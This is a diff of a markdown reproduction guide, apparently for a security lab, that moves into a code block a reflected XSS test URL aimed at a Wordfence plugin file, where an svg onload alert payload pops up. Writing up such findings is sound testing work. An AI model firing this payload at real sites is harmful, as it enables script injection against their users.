@@ -12,8 +12,10 @@ The Moodle instance installed has a XSS vulnerability in the parameter redirect_
 
 Go to:
 
- -  https://$DOMAIN/wp-content/plugins/wordfence/lib/diffResult.php?file=%22%3E%3Csvg%2Fonload%3Dalert(\`XSS!`)%3E
- -  
+   ``` 
+   https://$DOMAIN/wp-content/plugins/wordfence/lib/diffResult.php?file=%22%3E%3Csvg%2Fonload%3Dalert(\`XSS!`)%3E
+   ```
+  
 You will see a popup appear. 
 
 
